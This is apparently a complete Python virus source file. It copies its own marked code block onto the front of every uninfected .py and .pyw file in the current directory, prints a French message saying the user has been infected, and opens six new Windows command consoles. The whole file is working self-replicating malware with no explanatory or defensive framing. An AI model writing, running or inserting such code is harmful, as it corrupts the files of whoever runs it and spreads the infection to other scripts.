# VIRUS START!
import sys,glob
import itertools,subprocess,sys,os

virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()


self_replicating_part = False
for line in lines:
    if line == "# VIRUS START!\n":
        self_replicating_part = True
    if self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS END!\n" :
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS START!\n":
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)

print("Vous avez été infecté yeah! ")
f = os.path.basename(sys.argv[0])
print(f)
for t in range(2):
    subprocess.Popen(r"cmd", creationflags=subprocess.CREATE_NEW_CONSOLE)
    subprocess.Popen(r"cmd", creationflags=subprocess.CREATE_NEW_CONSOLE)
    subprocess.Popen(r"cmd", creationflags=subprocess.CREATE_NEW_CONSOLE)
    [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=1)]

# VIRUS END!\n


